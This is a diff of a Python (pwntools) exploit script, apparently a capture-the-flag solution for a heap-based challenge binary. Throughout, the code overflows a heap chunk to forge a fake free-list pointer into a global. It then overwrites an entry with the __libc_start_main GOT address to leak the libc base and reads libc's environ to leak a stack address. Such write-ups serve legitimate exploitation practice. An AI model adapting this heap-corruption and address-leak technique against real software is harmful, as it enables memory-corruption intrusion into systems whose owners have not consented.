@@ -59,24 +59,22 @@ leave(1, 32, 'B'*8)
 # Overflow
 delete(1)
 delete(0)
-payload = ('A'*32 + p64(0) + p64(0x31) +
-        p64(global_size-0x10))
+payload = ('A'*32 + p64(0) + p64(0x31) + # Restore chunk struct
+        p64(global_size-0x10))           # Fake fd
 leave(0, 400, payload, True)
-leave(0, 32, 'A'*4)          # malloc garbage
-leave(3, 32, 'A'*7)          # Get the chunk in global
-fix_size_payload = '\x20'.ljust(4, '\x00')*3 + '\x00\x01\x00\x00'
-edit(fix_size_payload)
+leave(0, 32, 'A'*4)                      # malloc garbage
+fix_size_payload = '\xf0'.ljust(4, '\x00')*4
+payload = fix_size_payload + p64(libc_start_main_got)
+leave(3, 32, payload)                    # Get the chunk in global
 
 # Leak libc base
-payload = fix_size_payload + p64(libc_start_main_got) + p64(global_size+0x20)
-edit(payload)
 view(0)
 r.recvuntil('View Message: ')
 base = u64(r.recvline()[:-1] + '\x00'*2) - libc.symbols['__libc_start_main']
 log.success('base : {}'.format(hex(base)))
 
 # Leak stack address
-payload = fix_size_payload + p64(base + libc.symbols['environ']) + p64(global_size)
+payload = fix_size_payload + p64(base + libc.symbols['environ'])
 edit(payload)
 view(0)
 r.recvuntil('View Message: ')
